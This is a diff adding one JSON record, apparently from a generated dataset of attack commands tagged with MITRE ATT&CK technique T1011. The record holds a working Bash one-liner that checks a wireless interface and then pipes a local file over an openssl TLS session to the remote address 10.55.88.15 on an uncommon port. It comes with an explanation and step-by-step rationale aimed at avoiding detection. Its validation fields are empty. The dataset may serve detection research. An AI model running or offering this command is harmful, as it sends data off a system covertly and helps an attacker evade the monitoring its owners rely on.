@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && openssl s_client -quiet -connect 10.55.88.15:49573 -bind \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\":0 < /home/user/.cache/map.dat",
+  "explanation": "Sends data over a TLS session explicitly bound to wlan2, using a non-standard port to minimize detection; this leverages a distinct wireless medium consistent with T1011.",
+  "rationale_steps": [
+    "Validate wlan2 as the alternate medium using iwconfig.",
+    "Bind the TLS client to wlan2\u2019s local IP to isolate the path from the primary channel.",
+    "Transmit the file over a high, uncommon port without altering system routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-a13a4d10",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
